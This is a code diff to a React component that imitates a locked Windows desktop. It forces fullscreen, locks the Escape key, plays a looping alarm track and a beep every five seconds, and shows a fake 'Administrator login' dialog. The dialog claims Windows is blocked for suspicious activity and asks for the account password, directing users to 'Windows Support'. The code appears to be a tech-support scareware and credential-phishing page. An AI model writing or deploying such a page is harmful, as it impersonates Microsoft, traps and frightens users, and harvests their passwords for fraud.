@@ -13,7 +13,7 @@ function Microsoft() {
         if ('keyboard' in navigator) {
             try {
                 await (navigator as any).keyboard.lock(['Escape']);
-            } catch (err) {}
+            } catch (err) { }
         }
     };
 
@@ -32,7 +32,6 @@ function Microsoft() {
                 await elem.requestFullscreen();
                 if (isMounted) await requestKeyboardLock();
             } catch (err) {
-                // Fake fullscreen fallback
                 Object.assign(document.documentElement.style, {
                     position: 'fixed',
                     inset: '0',
@@ -61,7 +60,7 @@ function Microsoft() {
             unlockKeyboard();
             document.removeEventListener('fullscreenchange', handleFullscreenChange);
             if (document.fullscreenElement) {
-                document.exitFullscreen().catch(() => {});
+                document.exitFullscreen().catch(() => { });
             }
         };
     }, []);
@@ -94,9 +93,25 @@ function Microsoft() {
             window.removeEventListener('keyup', handleKeyUp, { capture: true });
         };
     }, [escHoldStart]);
+    useEffect(() => {
+        const secondAudio = new Audio("/microsoft/censor-beep-2.mp3");
+        const playAudio = () => {
+            secondAudio.currentTime = 0; 
+            secondAudio.play().catch(() => { }); 
+        };
+
+        const interval = setInterval(playAudio, 5000);
+
+        return () => {
+            clearInterval(interval);
+            secondAudio.pause();
+        };
+    }, []);
 
     return (
         <div className="fake-desktop">
+            <audio src="/microsoft/generated-audio.mp3" autoPlay loop />
+
             <div className="left-container">
                 <div className="top-right-toolbar">
                     <div className="window-buttons">
@@ -154,9 +169,9 @@ function Microsoft() {
                             <button className="close" onClick={() => setShowLogin(false)}>×</button>
                         </div>
                         <div className="dialog-body">
-                            <span style={{fontSize: "28px", fontFamily: "Segoe UI"}}>Administrator login</span>
-                            <p style={{marginTop: "20px"}}>
-                                Windows has been blocked due to suspicious activity. 
+                            <span style={{ fontSize: "28px", fontFamily: "Segoe UI" }}>Administrator login</span>
+                            <p style={{ marginTop: "20px" }}>
+                                Windows has been blocked due to suspicious activity.
                                 Try logging in again with your Windows account and password.
                                 If you need help, contact Windows Support.
                             </p>
